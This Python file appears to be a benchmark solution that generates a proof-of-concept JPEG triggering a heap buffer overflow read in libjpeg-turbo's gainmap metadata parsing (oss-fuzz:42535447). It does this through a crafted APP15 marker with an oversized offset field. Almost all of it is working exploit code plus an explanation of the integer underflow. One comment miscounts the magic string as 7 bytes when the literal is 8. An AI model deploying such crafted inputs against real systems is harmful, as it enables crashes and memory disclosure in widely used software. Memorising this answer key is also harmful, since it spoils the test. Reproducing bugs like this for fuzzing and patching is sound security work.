import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a heap buffer overflow in libjpeg-turbo's
        decodeGainmapMetadata function (oss-fuzz:42535447).

        The vulnerability is an integer underflow when calculating the size of the
        gainmap data. The size is computed as `marker->data_length - offset`, where
        both are unsigned integers. If `offset` (read from the input) is larger
        than `marker->data_length` (the actual size of the input chunk), the
        subtraction wraps around to a very large positive number.

        This large number is then used as the size for a memory allocation and
        a subsequent `MEMCOPY`. The source of the copy is calculated as
        `marker->data + offset`, which points outside the bounds of the input
        buffer, leading to an immediate heap-buffer-overflow read.

        This solution constructs a minimal JPEG file containing a crafted APP15
        marker that sets `offset` to be slightly larger than `marker->data_length`
        to trigger the vulnerability.
        """
        
        # The offset of the 'offset' field within the APP15 marker payload is fixed.
        # It's located after a 7-byte magic string and several 32-bit fields.
        # Magic ('GAINMAP\0'): 7 bytes
        # Version: 2 bytes
        # Flags: 4 bytes
        # Base/Alt Headroom: 2 * 4 = 8 bytes
        # log2_ratio_min: 3 * 4 = 12 bytes
        # log2_ratio_max: 3 * 4 = 12 bytes
        # Gamma: 3 * 4 = 12 bytes
        # Total before offset field: 7 + 2 + 4 + 8 + 12 + 12 + 12 = 57 bytes.
        offset_field_pos = 57

        # To include the 4-byte offset field, the payload must be at least 61 bytes.
        # We'll use this as our marker_data_length.
        marker_data_length = offset_field_pos + 4

        # To trigger the underflow, we set `offset > marker_data_length`.
        offset_value = marker_data_length + 1

        # Construct the malicious APP15 payload.
        payload = b'GAINMAP\x00'
        # Pad with null bytes to reach the offset field.
        payload += b'\x00' * (offset_field_pos - len(payload))
        # Write the malicious offset value as a 4-byte big-endian integer.
        payload += struct.pack('>I', offset_value)

        # Build the final JPEG PoC file.
        # SOI (Start of Image)
        poc = b'\xff\xd8'
        # APP15 marker
        poc += b'\xff\xef'
        # Marker length (payload length + 2 bytes for the length field itself)
        # This is a 16-bit big-endian value.
        poc += struct.pack('>H', len(payload) + 2)
        # The malicious payload
        poc += payload
        # EOI (End of Image)
        poc += b'\xff\xd9'
        
        return poc